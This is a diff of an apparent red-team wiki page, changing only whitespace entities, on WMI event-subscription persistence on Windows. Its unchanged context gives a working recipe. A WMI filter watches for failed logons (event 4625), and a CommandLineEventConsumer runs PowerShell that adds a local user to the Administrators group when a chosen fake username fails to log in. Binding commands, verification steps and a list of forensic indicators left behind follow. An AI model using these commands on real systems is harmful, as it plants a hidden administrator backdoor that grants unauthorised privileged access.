@@ -21,11 +21,11 @@ Basic options:
 
 ```
 
-### Manual Mode&#x20;
+### Manual Mode
 
 * Check if WMI is enabled, if it is not any `WMI` command that you execute will attempt to download `WMI`
 * This download process does log in the `WMI Log`
-* Check if WMI is enabled on the remote system&#x20;
+* Check if WMI is enabled on the remote system
 
 ```
 reg query "HKLM\System\CurrentControlSet\Services\Winmgt"
@@ -39,13 +39,13 @@ Start        REG_DWORD        0x2
 get-service Winmgmt
 ```
 
-*   &#x20;
+*
 
     <figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
-#### Check for existing entries&#x20;
+#### Check for existing entries
 
-* Check for existing event filter consumer bindings that are on the system&#x20;
+* Check for existing event filter consumer bindings that are on the system
 
 ```
 Get-Wmiobject -Class __FilterToConsumerBinding -NameSpace "root\Subscription"
@@ -53,7 +53,7 @@ Get-Wmiobject -Class __FilterToConsumerBinding -NameSpace "root\Subscription"
 
 #### Ensure the system is logging event logs for the type of event you want to use
 
-* #### - i.e. logon, logoff event&#x20;
+* **- i.e. logon, logoff event**
 
 ```
 auditpol /get /category:*
@@ -77,44 +77,44 @@ Logon/Logoff
   Group Membership                        No Auditing
 ```
 
-#### Create your own filter and consumer&#x20;
+#### Create your own filter and consumer
 
 ```
 $x='SCM System Log Filter'
 $z='SCM System Log Consumer'
 ```
 
-#### Now create the triggering event&#x20;
+#### Now create the triggering event
 
 ```
 $q='Select * from __InstanceCreationEvent WITHIN 10 where TargetInstance isa 'Win32-NtLogEvent' and TargetInstance.logfile='Security' and (TargetInstance.EventCode='4625')"
 ```
 
-#### Now create your event filter&#x20;
+#### Now create your event filter
 
 ```
 $wmifilter=Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$x;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$q} ErrorAction Stop
 ```
 
-#### Create the event consumer&#x20;
+#### Create the event consumer
 
 ```
 $wmiconsumer=Set-WmiInstance -Class CommandLineEventConsumer -NameSpace "root\subscription" -Arguments @{Name=$z;CommandLineTemplate='C:\\Windows\\System32\\windowspowershell\\v.1.0\\powershell.exe -v 2.0 -nop -c "if(wevtutil qe security /rd:true /f:text /c:1 `"*[System/EventID=4625]`" | findstr /i "fake username here"){net localgroup Administrators <localuser> /add}"'}
 ```
 
-#### Combine the filter and the comsumer&#x20;
+#### Combine the filter and the comsumer
 
 ```
 Set-WmiInstance -Class __FilterToConsumerBinding -NameSpace "root\subscription" -Arguments @{Filter=$wmifilter;Consumer=$wmiconsumer}
 ```
 
-#### Ensure Its all working and correct&#x20;
+#### Ensure Its all working and correct
 
 ```
 Get-WmiObject -Class __FilterToConsumerBinding -NameSpace "root\subscription"
 ```
 
-### IOCs Left Behind&#x20;
+### IOCs Left Behind
 
 ```
 C:\Windows\System32\Wbem\Repository\INDEX.BTR
@@ -127,7 +127,7 @@ C:\Windows\System32\Wbem\Repository\MAPPING2.MAP
 "HKLM\Software\Microsoft\Wbem\Ess\//./root\CIMV2\MS_NT_EVENT_LOG_EVENT_PROVIDER"
 ```
 
-#### Other Logs&#x20;
+#### Other Logs
 
 ```
 5857 Active ScriptEventConsumer provider started with result code 0x0
